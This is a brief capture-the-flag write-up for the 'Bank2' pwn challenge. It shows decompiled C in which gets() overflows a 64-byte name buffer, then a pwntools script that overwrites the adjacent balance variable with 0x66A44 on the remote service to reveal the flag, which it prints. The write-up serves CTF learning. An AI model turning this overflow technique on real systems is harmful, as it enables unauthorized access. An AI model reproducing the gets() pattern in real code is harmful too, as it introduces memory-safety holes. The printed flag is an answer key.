# **Bank2**

Pseudo code from IDA:

```c++
void getFlag()
{
  system("cat flag.txt");
}
void Register()
{
  char name[64]; // [esp+Ch] [ebp-4Ch] BYREF
  int balance; // [esp+4Ch] [ebp-Ch]

  balance = 0;
  printf("[+] Please enter your name: ");
  gets(name);
  printf("[+] Thanks for the registration, your balance is %d.\n", balance);
  if ( balance == 0x66A44 )
    getFlag();
}
```

Bank2 is pretty the same with happy birthday so we need to overwrite `balance` with `0x66A44`.

The exploit code:

```python
from pwn import *

r = remote("61.28.237.24",30203)

r.recvuntil('[+] Please enter your name: ')
payload= "A"*64+p32(0x66A44) #64 "A" for name[64] and /x44/x6A/x06 for balance
r.send(payload)
r.interactive()
#HCMUS-CTF{little_endian_is_fun}
```

[**Turn Back**](README.md)